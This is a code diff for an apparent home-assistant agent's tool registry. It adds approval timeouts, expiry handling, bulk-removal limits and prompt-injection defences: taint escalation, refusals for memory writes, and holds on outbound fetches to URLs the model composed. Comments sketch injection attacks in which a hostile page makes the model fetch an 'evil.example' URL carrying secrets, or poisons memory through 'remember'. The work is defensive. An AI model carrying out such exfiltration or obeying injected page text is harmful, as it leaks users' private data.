@@ -85,6 +85,11 @@ EVENT_TOOL_FINISHED = "jarvis_tool_finished"
 
 EVENT_APPROVAL_REQUIRED = "jarvis_approval_required"
 EVENT_APPROVAL_RESOLVED = "jarvis_approval_resolved"
+#: A held request that lapsed on its clock, unanswered. Fired when the
+#: registry notices (it purges lazily, on the next call or listing), so a
+#: surface must keep its own countdown too — this is the confirmation, not the
+#: alarm. Carries the request plus `expired: true`.
+EVENT_APPROVAL_EXPIRED = "jarvis_approval_expired"
 EVENT_BACKGROUND_TASK = "jarvis_background_task"
 EVENT_TOOL_CALLED = "jarvis_tool_called"
 
@@ -94,6 +99,23 @@ TIER_BACKGROUND = 2  # long-running, acknowledge then report
 TIER_APPROVAL = 3  # never runs without a human saying yes
 
 DEFAULT_APPROVAL_TTL = 300.0
+#: How long a QUESTION waits, as distinct from an action.
+#:
+#: An action held for approval is a thing about to happen, and five minutes is
+#: the longest anybody should be able to say yes to "unlock the front door"
+#: after they stopped thinking about it. A question is the assistant waiting
+#: on a fact — which lamp, what URL — and the person it is waiting on has
+#: walked off, is driving, is in the shower. The operator answered one after
+#: five minutes and got "unknown, expired or already-used approval request".
+#: Thirty minutes is the phone's own conversation-thread expiry
+#: (`ConversationRegistry`, docs/cross-device.md), so a question lives as long
+#: as the thread it belongs to.
+DEFAULT_QUESTION_TTL = 1800.0
+#: How many lapsed requests are remembered, so an answer that arrives late can
+#: be told "that expired after N minutes" rather than the three-way guess.
+#: Bounded because a request id is a dozen bytes and a busy year is a lot of
+#: them; beyond the bound the old sentence is still the truth.
+MAX_LAPSED = 200
 MAX_TOOL_RESULT_CHARS = 4000
 
 #: How many entities `list_entities` answers with, and the most it will.
@@ -104,6 +126,21 @@ MAX_TOOL_RESULT_CHARS = 4000
 #: truncated list rather than a short house.
 LIST_ENTITIES_DEFAULT = 100
 LIST_ENTITIES_MAX = 300
+
+#: The most entities `remove_entities` takes in one approval.
+#:
+#: An approval is read by a person in a few seconds; a card naming forty ids
+#: is one nobody reads before pressing yes, which makes it a card that
+#: approves whatever is on it. Removing more is more than one approval.
+MAX_REMOVE_AT_ONCE = 20
+
+#: Words that mean "everything" and are refused as a removal target. "Can you
+#: remove all of the elements of the house?" is the operator's sentence; an
+#: approval that read "remove: all" would show nothing of what it removes.
+REMOVE_WILDCARDS = frozenset(
+    {"*", "all", "everything", "every", "all of them", "the house", "house", "all entities",
+     "all the entities", "all devices", "all the devices", "everything in the house"}
+)
 
 #: Bounds on a question the model asks a human.
 #:
@@ -697,6 +734,68 @@ def _as_list(value: Any) -> list[Any]:
 # tools
 # ===========================================================================
 ToolHandler = Callable[[dict[str, Any], Any], Awaitable[Any] | Any]
+#: The tools that only read. Everything not named here is treated as
+#: state-changing, which is why this list is explicit rather than inferred: a
+#: tool that arrives later and is genuinely read-only gets added deliberately,
+#: and one that arrives and is forgotten escalates instead of slipping through.
+#:
+#: Reading is not the same as harmless — `web_fetch` is how hostile text gets
+#: in — but reading is not an ACTION, and this list only decides whether the
+#: turn may proceed without a human once something hostile has been read.
+READ_ONLY_TOOLS = frozenset({
+    "explain_last_turn", "recent_moments", "list_automations", "whats_new",
+    # the house, observed
+    "get_state", "list_entities", "list_devices", "get_user_context", "recent_events",
+    "list_my_devices", "list_cameras", "look_at_camera", "describe_camera_change",
+    "get_automation_trace", "get_briefing", "list_scheduled", "metrics_query",
+    # what it knows
+    "recall", "note_search", "use_skill",
+    # what it is doing
+    "task_status", "code_task_status", "list_code_repositories",
+    # files and the web, which read and never write
+    "list_files", "read_file", "search_files",
+    "web_search", "web_fetch", "web_browse", "web_crawl",
+    # the overhaul's readers (M57–M59): readings, the sky, a page, a feed,
+    # what is watched. Setting a watch is a write and is not here — a hostile
+    # page must not be able to make the house watch something.
+    "sensor_readings", "sensor_compare", "sensor_history", "sensor_summary",
+    "next_pass", "overhead_now", "moon_phase", "planets_tonight",
+    "read_page", "feed_latest", "list_watches",
+    # the settings registry, read (M67). `change_setting` is Tier 3 and is
+    # deliberately not here: a page must not be able to change the wake word.
+    "list_settings",
+})
+
+
+#: Tools that REFUSE on a tainted turn rather than asking a human.
+#:
+#: Stricter than the escalation below, and deliberately so. Approval works when
+#: a person can evaluate what they are approving: "unlock the front door" is a
+#: sentence somebody can judge. `remember: the spare key is under the mat` is
+#: not — it looks like a note, it reads as innocuous, and what it actually does
+#: is write into the system prompt of every future conversation. A human cannot
+#: audit that in the two seconds an approval gets, so the answer is no rather
+#: than "are you sure".
+#:
+#: Each of these refuses inside its own handler, with its own wording; naming
+#: them here keeps the gate from turning that refusal into a prompt.
+#: `test_the_refusers_really_do_refuse` holds the two in step.
+REFUSE_WHEN_TAINTED = frozenset({"remember", "forget", "undo_last_action"})
+
+#: Reads that reach OUTSIDE the house, and so can carry something out. They
+#: are read-only — a fetch changes nothing here — but on a tainted turn they
+#: are the exfiltration channel: a page the model has read can tell it to
+#: fetch `https://evil.example/?k=<what the prompt holds>`, and a read-only
+#: tool that runs without a human would carry the notes, the names and the
+#: keys in the context out in the URL. So on a tainted turn these are HELD
+#: like an action (M109): a person sees the URL and says yes or no. On a
+#: clean turn they run as the reads they are. Enforced here, in the gate,
+#: not in the prompt; `test_the_taint_table` holds every tool to it.
+OUTBOUND_READERS = frozenset({
+    "web_search", "web_fetch", "web_browse", "web_crawl", "read_page", "feed_latest",
+})
+
+
 GateCheck = Callable[[dict[str, Any]], bool]
 TargetPin = Callable[[dict[str, Any]], dict[str, Any]]
 
@@ -714,6 +813,26 @@ class Tool:
     #: that freeze *what* was approved, so the action executed later is the
     #: one the human was shown rather than a fuzzy name re-resolved minutes on.
     pin: TargetPin | None = None
+    #: True for a tool that only READS. It is the whole of the taint
+    #: escalation: once a turn has seen external content, every tool that is
+    #: not read-only needs a human before it runs, whatever the content asked
+    #: for. Defaulting to False is deliberate — a new tool nobody classified
+    #: escalates, which is the safe direction to be wrong in.
+    read_only: bool = False
+    #: True for a tool that applies the taint rule ITSELF, at the surface that
+    #: runs the action. `control_device` is the one: device_control raises the
+    #: device's tier to CONFIRM for the rest of a tainted turn, reason carried
+    #: verbatim, so the phone shows the human the real action before it runs.
+    #: Holding it here as well asked twice — and the second prompt, on the
+    #: server, named the tool rather than the action (the harness self-test
+    #: `test_reading_untrusted_content_raises_the_next_action_to_confirm`
+    #: caught it). Declared, never inferred: a tool that does not say so is
+    #: escalated like any other, which is the safe direction to be wrong in.
+    escalates_itself: bool = False
+    #: Not offered to the model. For work the house raises on its own behalf
+    #: through the approvals machinery — a notice's offer (M86) is a held
+    #: question with a handler, not something the model should ever call.
+    hidden: bool = False
     #: The ONE argument a human may fill in when they resolve this request.
     #:
     #: Almost always None, and that is the point. `approve_request` accepts an
@@ -724,6 +843,28 @@ class Tool:
     #: writable key here, per tool, is what keeps that impossible — a tool that
     #: does not opt in cannot be answered, only approved or denied.
     answerable: str | None = None
+    #: One sentence for the consent surface, composed from the PINNED
+    #: arguments when the request is raised: "Change Temperature from 0.7 to
+    #: 0.2". The banner used to render every held action as `key: value`
+    #: pairs, which is readable for `entity_id: lock.front_door` and not for
+    #: a setting — a person approving `key: llm.options.temperature · value:
+    #: 0.2` does not know what it was before, and "from what" is the whole
+    #: decision. Composed here and never on the surface, so the sentence is
+    #: made from what will run rather than from what the model said; and
+    #: never by the model, whose words a hostile page can choose.
+    summarise: Callable[[dict[str, Any]], str] | None = None
+    #: A sentence refusing the call before anything is held, or None.
+    #:
+    #: The one check that runs BEFORE a Tier-3 request goes to a human. The
+    #: schema check catches a missing key; this catches a call that is well
+    #: formed and must still not be put in front of somebody — "remove all of
+    #: the elements of the house" with no ids named, which as an approval
+    #: would read "remove: everything" and show nothing of what it removes.
+    #: Returning a sentence is the refusal, in the model's tool result, so the
+    #: next round can ask for what was missing instead of retrying.
+    #: A sentence that refuses the call before anything runs — given the
+    #: arguments, and the turn's context too when it takes two parameters.
+    refuse: Callable[..., str | None] | None = None
 
     def schema(self) -> dict[str, Any]:
         """Ollama / OpenAI function-calling schema for this tool."""
@@ -773,6 +914,30 @@ class PendingRequest:
     #: words. Carried to every consent surface so a human can see it.
     tainted: bool = False
 
+    #: The sentence a surface shows in place of the tool's name, from
+    #: `Tool.summarise` over the pinned arguments. Empty for a tool that has
+    #: none, and the surface then falls back to the name and the arguments —
+    #: which is what every request looked like before M67.
+    summary: str = ""
+    #: The conversation whose turn raised this, when the agent said which.
+    #:
+    #: What lets the NEXT thing said in that conversation answer it — see
+    #: `ConversationAgent._answer_pending` — and nothing said anywhere else.
+    #: None for a request raised outside a conversation (the console's
+    #: `jarvis/tools/call`), which then can only be resolved on a surface.
+    conversation_id: str | None = None
+
+    #: True when the turn that raised this is spoken — its reply, which is the
+    #: model's own sentence and carries the question, will be read aloud by
+    #: the surface the user spoke to. A phone that gets the question as well
+    #: (`companion.ask`) shows it and does not read it out again.
+    spoken: bool = False
+
+    #: The clock this was put on, in seconds — `question_ttl` for a question,
+    #: `approval_ttl` for an action — so a late answer can be told how long it
+    #: had, in the same number the banner counted down.
+    ttl: float = DEFAULT_APPROVAL_TTL
+
     def as_dict(self) -> dict[str, Any]:
         return {
             "request_id": self.id,
@@ -784,6 +949,10 @@ class PendingRequest:
             "answerable": self.answerable,
             "choices": list(self.choices),
             "tainted": self.tainted,
+            "summary": self.summary,
+            "conversation_id": self.conversation_id,
+            "spoken": self.spoken,
+            "ttl": self.ttl,
         }
 
 
@@ -815,6 +984,50 @@ def _short(value: Any) -> Any:
         return value
     text = str(value)
     return text[:MAX_EVENT_VALUE_CHARS]
+
+
+#: A summary is shown on a consent surface at the width of one line; the
+#: phone's card wraps at about this many characters and a longer sentence is
+#: one the person stops reading.
+MAX_SUMMARY_CHARS = 200
+
+
+def _summary_of(tool: Tool, pinned: dict[str, Any]) -> str:
+    """The held request's sentence, or "" when the tool has none or it failed.
+
+    Bounded and stringified for the same reason `_choice_list` is: the pinned
+    arguments can contain a value the model chose the size of, and this goes
+    verbatim onto a screen.
+    """
+    if tool.summarise is None:
+        return ""
+    try:
+        text = str(tool.summarise(pinned) or "").strip()
+    except Exception:  # pragma: no cover - a bad sentence must not hold or free anything
+        _LOGGER.exception("Could not summarise %s for approval", tool.name)
+        return ""
+    return " ".join(text.split())[:MAX_SUMMARY_CHARS]
+def _minutes(seconds: float) -> str:
+    """A clock in words — "5 minutes", "30 minutes", "90 seconds" — for the
+    sentences a person hears. The banner shows the same number as digits."""
+    seconds = float(seconds)
+    if seconds < 120:
+        return f"{int(round(seconds))} seconds"
+    minutes = int(round(seconds / 60))
+    return f"{minutes} minute{'' if minutes == 1 else 's'}"
+
+
+def expired_sentence(tool: str, ttl: float, question: bool) -> str:
+    """What a late answer is told. Spoken by the voice and shown on the banner,
+    so it is one sentence in one place."""
+    if question:
+        return (
+            f"That question expired after {_minutes(ttl)}; ask again and I'll wait."
+        )
+    return (
+        f"That request to {tool} expired after {_minutes(ttl)}; "
+        "ask again and I'll hold it for you."
+    )
 
 
 def _choice_list(arguments: dict[str, Any]) -> tuple[str, ...]:
@@ -863,6 +1076,9 @@ def _weaker_than(new: Tool, old: Tool) -> str:
       provenance stamp went missing without anything failing.
     * **domain** is what `requires_approval` compares against `GATED_DOMAINS`,
       so dropping `domain="lock"` un-gates every lock in the house.
+    * **escalates_itself** switches the taint hold off for the tool, on the
+      promise that the surface running it asks instead. A replacement that
+      makes the promise the original did not keep is the hold going missing.
     """
     if new.tier < old.tier:
         return f"tier {old.tier} -> {new.tier}"
@@ -872,7 +1088,72 @@ def _weaker_than(new: Tool, old: Tool) -> str:
         return f"loses answerable={old.answerable!r}, so the phone bridge drops it"
     if old.domain and new.domain != old.domain:
         return f"domain {old.domain!r} -> {new.domain!r}"
+    if new.escalates_itself and not old.escalates_itself:
+        return "claims to escalate itself, so the registry would stop holding it after untrusted content"
+    if old.refuse is not None and new.refuse is None:
+        return "loses its refusal check, so a call it used to refuse would be held for a human"
     return ""
+
+
+def _url_composed(url: str, shown: str) -> bool:
+    """Was this URL written by the model, or was the turn shown it?
+
+    Shown as it stands, or as a link the page carried: a page says
+    `href="warranty.pdf"` and the model fetches
+    `http://handbook/warranty.pdf` — the same link, resolved. So the path,
+    or its last segment, counts as shown (verify-all's research briefing on
+    27 Aug 2026 had the handbook's warranty PDF held as "composed"). The
+    query string never gets that latitude: `?r=<the reading>` is where a
+    secret goes out, and every token in it must have been shown.
+    """
+    from urllib.parse import urlparse
+
+    lowered = url.lower()
+    if lowered in shown:
+        return False
+    parsed = urlparse(lowered)
+    path = parsed.path or ""
+    segment = path.rsplit("/", 1)[-1]
+    known_path = (len(path) >= 6 and path in shown) or (len(segment) >= 6 and segment in shown)
+    if not known_path:
+        return True
+    for token in re.findall(r"[a-z0-9][a-z0-9_-]{5,}", parsed.query):
+        if token not in shown:
+            return True
+    return False
+
+
+def _refusal_takes_context(refuse: Any) -> bool:
+    """A refusal may read the turn (its second parameter); most read the arguments alone."""
+    try:
+        import inspect
+
+        return len(inspect.signature(refuse).parameters) >= 2
+    except (TypeError, ValueError):  # pragma: no cover - a builtin or a mock
+        return False
+
+
+def _utterance_of(jarvis: Any, context: Any) -> str:
+    """What the user said this turn, or "" — from the utterance store the memory policy reads."""
+    try:
+        from ..api.devices import get_turn_utterances
+
+        return get_turn_utterances(jarvis).get(context)
+    except Exception:  # pragma: no cover - a missing store reads as nothing said
+        return ""
+
+
+def _strings_in(value: Any, depth: int = 0) -> list[str]:
+    """Every string inside a tool's arguments, however nested."""
+    if depth > 4:
+        return []
+    if isinstance(value, str):
+        return [value]
+    if isinstance(value, dict):
+        return [t for v in value.values() for t in _strings_in(v, depth + 1)]
+    if isinstance(value, (list, tuple)):
+        return [t for v in value for t in _strings_in(v, depth + 1)]
+    return []
 
 
 class ToolRegistry:
@@ -883,12 +1164,18 @@ class ToolRegistry:
         jarvis: "Jarvis",
         exposure: Exposure | None = None,
         approval_ttl: float = DEFAULT_APPROVAL_TTL,
+        question_ttl: float = DEFAULT_QUESTION_TTL,
     ) -> None:
         self.jarvis = jarvis
         self.exposure = exposure or Exposure()
         self.approval_ttl = approval_ttl
+        self.question_ttl = question_ttl
         self._tools: dict[str, Tool] = {}
         self._pending: dict[str, PendingRequest] = {}
+        #: Requests that lapsed, newest last, so `approve_request` can say so
+        #: in words. Popped from `_pending` and never executed; this is memory
+        #: of the fact, not a second queue.
+        self._lapsed: dict[str, PendingRequest] = {}
 
     # --- registration -----------------------------------------------------
     def register(
@@ -904,6 +1191,11 @@ class ToolRegistry:
         gate: GateCheck | None = None,
         pin: TargetPin | None = None,
         answerable: str | None = None,
+        read_only: bool = False,
+        escalates_itself: bool = False,
+        hidden: bool = False,
+        summarise: Callable[[dict[str, Any]], str] | None = None,
+        refuse: Callable[..., str | None] | None = None,
         replaces: str | None = None,
     ) -> Tool:
         """Add a tool. A re-registration may not quietly WEAKEN the one there.
@@ -956,6 +1248,11 @@ class ToolRegistry:
                 domain=domain,
                 gate=gate,
                 pin=pin,
+                read_only=read_only,
+                escalates_itself=escalates_itself,
+                hidden=hidden,
+                summarise=summarise,
+                refuse=refuse,
             )
         existing = self._tools.get(tool.name)
         if existing is not None and replaces != tool.name:
@@ -985,8 +1282,10 @@ class ToolRegistry:
         return sorted(self._tools)
 
     def as_openai_schema(self) -> list[dict[str, Any]]:
-        """The whole toolbox in the format Ollama's ``tools`` field wants."""
-        return [self._tools[name].schema() for name in sorted(self._tools)]
+        """The whole toolbox in the format Ollama's ``tools`` field wants — minus the hidden."""
+        return [
+            self._tools[name].schema() for name in sorted(self._tools) if not self._tools[name].hidden
+        ]
 
     # --- calling ----------------------------------------------------------
     async def call(self, name: str, args: Any = None, context: Any = None) -> Any:
@@ -1018,8 +1317,32 @@ class ToolRegistry:
                 "expected": tool.parameters.get("properties", {}),
             }
 
-        if self.requires_approval(tool, arguments):
-            return self._request_approval(tool, arguments, context)
+        # Before the gate, on purpose: a refused call is one that must not be
+        # held either. An approval that cannot show what it does is not an
+        # approval, and the model is better told why than made to wait.
+        if tool.refuse is not None:
+            try:
+                sentence = (
+                    tool.refuse(arguments, context)
+                    if _refusal_takes_context(tool.refuse)
+                    else tool.refuse(arguments)
+                )
+            except Exception:  # a broken check refuses, which is the safe way round
+                _LOGGER.exception("Refusal check for %s blew up; refusing", tool.name)
+                sentence = f"{tool.name} could not check its arguments; it was not run."
+            if sentence:
+                return {"status": "error", "error": str(sentence)}
+
+        if self.requires_approval(tool, arguments, context):
+            try:
+                return self._request_approval(tool, arguments, context)
+            except ToolError as exc:
+                # The pin found nothing to pin — a setting that does not exist,
+                # a value its validator refuses. Not held: an approval a human
+                # cannot grant is a card they can only deny, and the model
+                # learns nothing from a denial. The refusal names what is
+                # wrong instead, which the next round can act on.
+                return {"status": "error", "error": str(exc)}
         return await self._execute(tool, arguments, context)
 
     async def _execute(self, tool: Tool, args: dict[str, Any], context: Any) -> Any:
@@ -1036,6 +1359,9 @@ class ToolRegistry:
         except Exception as exc:  # a bad tool must not sink the conversation
             _LOGGER.exception("Tool %s failed", tool.name)
             return {"status": "error", "error": f"{type(exc).__name__}: {exc}"}
+        # Whatever came back, the turn has now been shown it — the links in
+        # it are links the model may follow (see `_composed`).
+        self._note_shown(context, result)
         self._fire(
             EVENT_TOOL_CALLED,
             {"tool": tool.name, "arguments": copy.deepcopy(args), "tier": tool.tier},
@@ -1044,11 +1370,32 @@ class ToolRegistry:
         return result
 
     # --- the gate ---------------------------------------------------------
-    def requires_approval(self, tool: Tool, args: dict[str, Any]) -> bool:
-        """Decided here, in code, never by the model."""
+    def requires_approval(
+        self, tool: Tool, args: dict[str, Any], context: Any = None
+    ) -> bool:
+        """Decided here, in code, never by the model.
+
+        The last clause is M43's, and it is the one that makes prompt injection
+        survivable rather than solved: once a turn has read anything from
+        outside — a page, an email, a message, a file — every tool that is not
+        read-only needs a human, whatever the content asked for. A page that
+        says "unlock the front door" gets an approval prompt in front of a
+        person, which is exactly what it would get if the user had said it.
+        """
         if tool.tier >= TIER_APPROVAL:
             return True
         if tool.domain and tool.domain in GATED_DOMAINS:
+            return True
+        if (
+            not self.is_read_only(tool)
+            and not tool.escalates_itself
+            and tool.name not in REFUSE_WHEN_TAINTED
+            and self._is_tainted(context)
+        ):
+            return True
+        # A read that reaches outside the house is the way out for what a
+        # hostile page wants carried: held on a tainted turn (M109).
+        if tool.name in OUTBOUND_READERS and self._is_tainted(context) and self._composed(args, context):
             return True
         if tool.gate is not None:
             try:
@@ -1057,6 +1404,53 @@ class ToolRegistry:
                 _LOGGER.exception("Gate check for %s blew up; requiring approval", tool.name)
                 return True
         return False
+
+    def is_read_only(self, tool: Tool) -> bool:
+        """Does this tool only read? Declared, never guessed.
+
+        `Tool.read_only` wins when it is set — that is how a dynamically
+        registered tool (MCP, n8n, `create_tool`) says what it is — and the
+        name list covers the built-ins. Anything else is state-changing.
+        """
+        return bool(tool.read_only) or tool.name in READ_ONLY_TOOLS
+
+    def _composed(self, args: Any, context: Any) -> bool:
+        """Does an outbound read aim somewhere this turn was never shown?
+
+        The way out for a secret is a URL or a query the model WROTE — a
+        page's "send the meter reading to https://evil/?r=…" carried out.
+        A link the turn was given (in a search result, on a page it read, in
+        the user's own words) is followed without a person; so is a query
+        made of words the turn has seen. Anything else on a tainted turn
+        waits. Empty arguments compose nothing.
+        """
+        try:
+            from ..api.devices import get_turn_utterances, get_untrusted_turns
+
+            shown = (
+                get_untrusted_turns(self.jarvis).seen_text(context)
+                + "\n"
+                + get_turn_utterances(self.jarvis).get(context)
+            ).lower()
+        except Exception:  # pragma: no cover - absent stores read as nothing shown
+            shown = ""
+        for value in _strings_in(args):
+            for url in re.findall(r"https?://[^\s<>\"']+", value, flags=re.I):
+                if _url_composed(url.rstrip(".,;:!?)"), shown):
+                    return True
+            rest = re.sub(r"https?://[^\s<>\"']+", " ", value, flags=re.I)
+            for token in re.findall(r"[a-z0-9][a-z0-9_-]{5,}", rest.lower()):
+                if token not in shown:
+                    return True
+        return False
+
+    def _note_shown(self, context: Any, result: Any) -> None:
+        try:
+            from ..api.devices import get_untrusted_turns
+
+            get_untrusted_turns(self.jarvis).note_seen(context, json.dumps(result, default=str)[:200_000])
+        except Exception:  # pragma: no cover - never a reason to lose a result
+            _LOGGER.debug("Could not note what the turn was shown", exc_info=True)
 
     def _is_tainted(self, context: Any) -> bool:
         """Has this turn already read something a stranger wrote?
@@ -1084,6 +1478,37 @@ class ToolRegistry:
             _LOGGER.debug("Could not read the taint flag", exc_info=True)
             return False
 
+    def _approval_payload(self, request: PendingRequest, tool: Tool) -> dict[str, Any]:
+        """What the model is handed for a held request, new or already waiting."""
+        waits = _minutes(request.ttl)
+        if tool.answerable:
+            message = (
+                f"The question has been put to the user and waits {waits} for their "
+                "answer — they can answer by saying it, or on the console or their "
+                "phone. Your reply now must BE the question, once, in one sentence; "
+                "do not also say that you are asking. Do not call ask_user again."
+            )
+        else:
+            message = (
+                "This action needs the user's explicit approval and has NOT run. "
+                f"It waits {waits}; they can confirm by saying yes, or on the console "
+                "or their phone. Tell them it is waiting on their confirmation, in "
+                "one sentence. Do not retry it."
+            )
+        return {
+            "status": "approval_required",
+            "request_id": request.id,
+            "tool": tool.name,
+            "arguments": copy.deepcopy(request.arguments),
+            # The same sentence the card shows, so the model's "waiting on
+            # your approval" can say what for — and a `jarvis/tools/call`
+            # from the console sees what the banner will.
+            "summary": request.summary,
+            "expires_at": request.expires_at,
+            "waits_seconds": request.ttl,
+            "message": message,
+        }
+
     def _pinned_arguments(self, tool: Tool, args: dict[str, Any]) -> dict[str, Any]:
         """Freeze a held action onto concrete targets.
 
@@ -1098,6 +1523,10 @@ class ToolRegistry:
             return pinned
         try:
             overrides = tool.pin(args)
+        except ToolError:
+            # Deliberate: the pin is saying there is nothing here to approve.
+            # `call()` turns it into the tool's error rather than a card.
+            raise
         except Exception:  # a broken pin must not turn into an unpinned approval
             _LOGGER.exception("Target pin for %s failed; approving by name", tool.name)
             return pinned
@@ -1111,13 +1540,36 @@ class ToolRegistry:
 
     def _request_approval(self, tool: Tool, args: dict[str, Any], context: Any) -> dict[str, Any]:
         now = time.time()
+        pinned = self._pinned_arguments(tool, args)
+        # A question waits on a fact; an action waits on consent. Different
+        # clocks — see `DEFAULT_QUESTION_TTL` for why the first is longer.
+        ttl = float(self.question_ttl if tool.answerable else self.approval_ttl)
+        conversation_id, spoken = self._turn_facts(context)
+        # The same request twice in one conversation is one card. On 27 Aug
+        # 2026 the serving layer handed a tool call back as text, the agent
+        # recovered it, and the model made the call as well — two identical
+        # lock_control holds in one turn, so the spoken yes that followed had
+        # two things waiting and locked nothing. A hold that is still pending,
+        # for the same tool with the same pinned arguments from the same
+        # conversation, is returned again rather than raised again.
+        for existing in self._pending.values():
+            if (
+                existing.tool == tool.name
+                and existing.arguments == pinned
+                and existing.conversation_id == conversation_id
+                and existing.expires_at > now
+            ):
+                _LOGGER.info(
+                    "Approval for %s already waiting (%s); not holding it twice", tool.name, existing.id
+                )
+                return self._approval_payload(existing, tool)
         request = PendingRequest(
             id=uuid.uuid4().hex[:12],
             tool=tool.name,
-            arguments=self._pinned_arguments(tool, args),
+            arguments=pinned,
             tier=tool.tier,
             created=now,
-            expires_at=now + self.approval_ttl,
+            expires_at=now + ttl,
             context=context,
             answerable=tool.answerable,
             # Only ever read off the model's own arguments for a tool that
@@ -1126,23 +1578,41 @@ class ToolRegistry:
             # nothing.
             choices=_choice_list(args) if tool.answerable else (),
             tainted=self._is_tainted(context),
+            # Over the PINNED arguments, so the sentence describes what will
+            # run. A summariser that throws leaves the sentence empty and the
+            # surface on the name-and-arguments rendering, never an unheld
+            # action.
+            summary=_summary_of(tool, pinned),
+            conversation_id=conversation_id,
+            spoken=spoken,
+            ttl=ttl,
         )
         self._pending[request.id] = request
         payload = request.as_dict()
         payload["description"] = tool.description
         self._fire(EVENT_APPROVAL_REQUIRED, payload, context)
-        _LOGGER.info("Approval required for %s (%s)", tool.name, request.id)
-        return {
-            "status": "approval_required",
-            "request_id": request.id,
-            "tool": tool.name,
-            "arguments": copy.deepcopy(request.arguments),
-            "expires_at": request.expires_at,
-            "message": (
-                "This action needs the user's explicit approval and has NOT run. "
-                "Tell them it is waiting on their confirmation. Do not retry it."
-            ),
-        }
+        _LOGGER.info(
+            "Approval required for %s (%s) in conversation %s: %s",
+            tool.name, request.id, conversation_id, json.dumps(pinned, sort_keys=True, default=str),
+        )
+        return self._approval_payload(request, tool)
+
+    def _turn_facts(self, context: Any) -> tuple[str | None, bool]:
+        """Which conversation this turn is, and whether its reply is spoken.
+
+        Recorded by the agent at the top of the turn (`remember_turn`); a
+        registry driven by something else — a test, the console's
+        `jarvis/tools/call` — has neither, and the request then belongs to no
+        conversation and is not spoken, which is the reading that resolves
+        nothing by accident.
+        """
+        try:
+            from ..api.devices import turn_facts_of
+
+            return turn_facts_of(self.jarvis, context)
+        except Exception:  # pragma: no cover - absent integration, never a crash
+            _LOGGER.debug("Could not read the turn's facts", exc_info=True)
+            return None, False
 
     async def approve_request(
         self, request_id: str, approved: bool = True, answer: Any = None
@@ -1158,6 +1628,20 @@ class ToolRegistry:
         self.purge_expired()
         request = self._pending.pop(request_id, None)  # popped first: no replay
         if request is None:
+            lapsed = self._lapsed.get(request_id)
+            if lapsed is not None:
+                # Known to have lapsed, so say so — with the clock it was on,
+                # which is the number the banner counted down — and what to
+                # do about it. The three-way guess below is for an id this
+                # registry has never held or has already spent.
+                return {
+                    "status": "error",
+                    "request_id": request_id,
+                    "tool": lapsed.tool,
+                    "expired": True,
+                    "waited_seconds": lapsed.ttl,
+                    "error": expired_sentence(lapsed.tool, lapsed.ttl, bool(lapsed.answerable)),
+                }
             return {
                 "status": "error",
                 "request_id": request_id,
@@ -1222,11 +1706,52 @@ class ToolRegistry:
         self.purge_expired()
         return [r.as_dict() for r in self._pending.values()]
 
+    def pending_for_conversation(self, conversation_id: str | None) -> list[dict[str, Any]]:
+        """What is waiting on THIS conversation, oldest first — and the house's questions.
+
+        Requests stamped with the conversation when raised, plus the QUESTIONS
+        the house raised with no conversation at all: a notice's offer (M86,
+        "the garage door has opened — shall I close it?") belongs to whoever
+        answers it, and "yes" said to any surface is that answer. Only
+        questions (`answerable`): an ACTION held with no conversation — a
+        script's, an automation's — is still nobody's to approve by voice, so
+        a "yes" meant for the garage cannot unlock a door a script asked
+        about. A request raised by ANOTHER conversation stays that
+        conversation's.
+        """
+        if not conversation_id:
+            return []
+        self.purge_expired()
+        return [
+            r.as_dict()
+            for r in self._pending.values()
+            if r.conversation_id == str(conversation_id)
+            or (not r.conversation_id and r.answerable)
+        ]
+
     def purge_expired(self, now: float | None = None) -> int:
         moment = time.time() if now is None else now
         stale = [rid for rid, r in self._pending.items() if r.expires_at <= moment]
+        # `getattr`: `test_expiry_and_purge_accept_an_explicit_zero` builds a
+        # registry around `__init__`, and a purge must still purge.
+        lapsed: dict[str, PendingRequest] = getattr(self, "_lapsed", None) or {}
+        self._lapsed = lapsed
         for rid in stale:
-            del self._pending[rid]
+            request = self._pending.pop(rid)
+            lapsed[rid] = request
+            self._fire(
+                EVENT_APPROVAL_EXPIRED,
+                {**request.as_dict(), "expired": True},
+                request.context,
+            )
+            _LOGGER.info(
+                "%s %s lapsed unanswered after %s",
+                "Question" if request.answerable else "Approval",
+                rid,
+                _minutes(request.ttl),
+            )
+        while len(lapsed) > MAX_LAPSED:
+            del lapsed[next(iter(lapsed))]
         return len(stale)
 
     # --- plumbing ---------------------------------------------------------
@@ -1368,6 +1893,40 @@ def _outcome(changed: list[dict[str, Any]], failed: dict[str, str]) -> dict[str,
     return payload
 
 
+#: The manifest shape `create_tool` accepts, as a worked example.
+#:
+#: Handed back with a REFUSAL rather than carried in the tool's description: a
+#: description is posted on every round of every turn (`tests/test_prompt_budget.py`
+#: measures what that costs), and this is useful only to a turn that is writing
+#: a tool and got the shape wrong. `tests/test_create_tool_handler.py` puts it
+#: through the real validator, because an example the validator refuses teaches
+#: the model to fail — which is exactly how this tool spent its first life.
+CREATE_TOOL_EXAMPLE = {
+    "name": "bin_day",
+    "description": "Which bin goes out this week.",
+    "service": {
+        "method": "GET",
+        "url": "http://192.168.1.5/bins?street={{ street }}",
+        "fields": {"street": {"type": "string", "description": "The street name."}},
+    },
+}
+
+
+def _resumed_description(registry_tasks: Any, task_id: str, description: str) -> str:
+    """The job's words, with what a restart already saw done in front of them."""
+    task = registry_tasks.get(task_id) if registry_tasks is not None and hasattr(registry_tasks, "get") else None
+    if task is None or not getattr(task, "resumed", False):
+        return description
+    done = [s.title for s in getattr(task, "steps", []) if getattr(s, "status", "") == "done" and getattr(s, "title", "")]
+    if not done:
+        return f"{description}\n\n(Picked back up after a restart: nothing was finished before it; start again.)"
+    listed = "; ".join(done[:8])
+    return (
+        f"{description}\n\n(Picked back up after a restart. Already done before it, do not repeat: "
+        f"{listed}. Plan and do only what remains, then write it up as a whole.)"
+    )
+
+
 def register_builtin_tools(
     registry: ToolRegistry, user_context: dict[str, Any] | None = None
 ) -> None:
@@ -1446,6 +2005,11 @@ def register_builtin_tools(
         for domain, entity_ids in _group_by_domain(resolution.entity_ids).items():
             data: dict[str, Any] = {"entity_id": entity_ids}
             service = action
+            if domain == "cover" and action in ("turn_on", "turn_off"):
+                # A cover opens and closes; "turn_off" on it reached
+                # `cover.turn_off` on the live house (27 Aug 2026) — the
+                # window closed, and the record said something no cover does.
+                service = "open_cover" if action == "turn_on" else "close_cover"
             if action == "turn_on":
                 if domain == "light":
                     if brightness is not None:
@@ -1519,12 +2083,22 @@ def register_builtin_tools(
                     "description": "Target temperature for a thermostat, or kelvin for a light.",
                 },
             }
+        # The flip is said as the flip it is. "Close the living room window"
